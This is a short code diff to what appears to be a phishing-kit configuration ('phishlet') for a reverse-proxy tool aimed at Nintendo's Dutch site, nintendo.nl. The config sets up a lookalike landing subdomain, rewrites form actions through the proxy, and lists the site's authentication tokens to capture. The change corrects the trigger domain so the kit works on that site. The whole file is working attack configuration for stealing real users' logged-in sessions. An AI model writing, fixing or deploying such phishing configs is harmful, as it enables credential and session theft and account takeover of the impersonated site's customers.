@@ -4,7 +4,7 @@ proxy_hosts:
   - {phish_sub: 'nintendo', orig_sub: 'www', domain: 'nintendo.nl', session: true, is_landing: true}
 
 sub_filters:
-  - {triggers_on: 'nintendo.com', orig_sub: 'www', domain: 'nintendo.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'nintendo.nl', orig_sub: 'www', domain: 'nintendo.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
   - domain: 'www.nintendo.nl'
